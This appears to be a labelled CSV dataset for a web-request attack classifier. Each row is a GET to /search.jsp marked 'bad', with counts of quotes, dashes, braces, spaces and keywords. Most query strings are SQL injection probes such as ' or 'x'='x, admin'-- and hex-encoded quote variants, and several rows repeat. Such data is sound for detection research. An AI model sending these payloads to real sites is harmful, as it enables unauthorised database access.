method,path,body,single_q,double_q,dashes,braces,spaces,badwords,class
GET,b'/search.jsp?query=harsh',b'',0,0,0,0,0,0,bad
GET,"b""/search.jsp?query='""",b'',1,0,0,0,0,0,bad
GET,"b'/search.jsp?query=""'",b'',0,1,0,0,0,0,bad
GET,b'/search.jsp?query=#',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=-',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=--',b'',0,0,1,0,0,0,bad
GET,"b""/search.jsp?query='%20--""",b'',1,0,1,0,1,0,bad
GET,"b""/search.jsp?query=--';""",b'',1,0,1,0,0,0,bad
GET,"b""/search.jsp?query='%20;""",b'',1,0,0,0,1,0,bad
GET,"b""/search.jsp?query==%20'""",b'',1,0,0,0,1,0,bad
GET,b'/search.jsp?query==%20;',b'',0,0,0,0,1,0,bad
GET,b'/search.jsp?query==%20--',b'',0,0,1,0,1,0,bad
GET,b'/search.jsp?query=\\x23',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=\\x27',b'',0,0,0,0,0,0,bad
GET,"b""/search.jsp?query=\\x3D%20\\x3B'""",b'',1,0,0,0,1,0,bad
GET,b'/search.jsp?query=\\x3D%20\\x27',b'',0,0,0,0,1,0,bad
GET,b'/search.jsp?query=\\x27\\x4F\\x52',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=\\x27\\x6F\\x72',b'',0,0,0,0,0,0,bad
GET,"b""/search.jsp?query='or%20select""",b'',1,0,0,0,1,1,bad
GET,"b""/search.jsp?query=admin'--""",b'',1,0,1,0,0,0,bad
GET,"b'/search.jsp?query=<>""\'%;)(&+'",b'',1,1,0,1,1,0,bad
GET,"b""/search.jsp?query='%20or%20''='""",b'',4,0,0,0,2,0,bad
GET,"b""/search.jsp?query='%20or%20'x'='x""",b'',4,0,0,0,2,0,bad
GET,"b'/search.jsp?query=""%20or%20""x""=""x'",b'',0,4,0,0,2,0,bad
GET,"b""/search.jsp?query=')%20or%20('x'='x""",b'',4,0,0,1,2,0,bad
GET,b'/search.jsp?query=0',b'',0,0,0,0,0,0,bad
GET,"b""/search.jsp?query='""",b'',1,0,0,0,0,0,bad
GET,"b'/search.jsp?query=""'",b'',0,1,0,0,0,0,bad
GET,b'/search.jsp?query=or',b'',0,0,0,0,0,0,bad
GET,"b""/search.jsp?query='""",b'',1,0,0,0,0,0,bad
GET,"b'/search.jsp?query=""'",b'',0,1,0,0,0,0,bad
GET,b'/search.jsp?query=or',b'',0,0,0,0,0,0,bad
GET,"b""/search.jsp?query='""",b'',1,0,0,0,0,0,bad
GET,"b'/search.jsp?query=""'",b'',0,1,0,0,0,0,bad
GET,"b""/search.jsp?query='""",b'',1,0,0,0,0,0,bad
GET,"b'/search.jsp?query=""\''",b'',1,1,0,0,0,0,bad
GET,b'/search.jsp?query=or',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=or%201=1',b'',0,0,0,0,1,0,bad
GET,b'/search.jsp?query=or%201=1',b'',0,0,0,0,1,0,bad
GET,"b""/search.jsp?query='""",b'',1,0,0,0,0,0,bad
GET,"b'/search.jsp?query=""'",b'',0,1,0,0,0,0,bad
GET,"b""/search.jsp?query='""",b'',1,0,0,0,0,0,bad
GET,"b'/search.jsp?query=""'",b'',0,1,0,0,0,0,bad
GET,"b""/search.jsp?query=')""",b'',1,0,0,0,0,0,bad
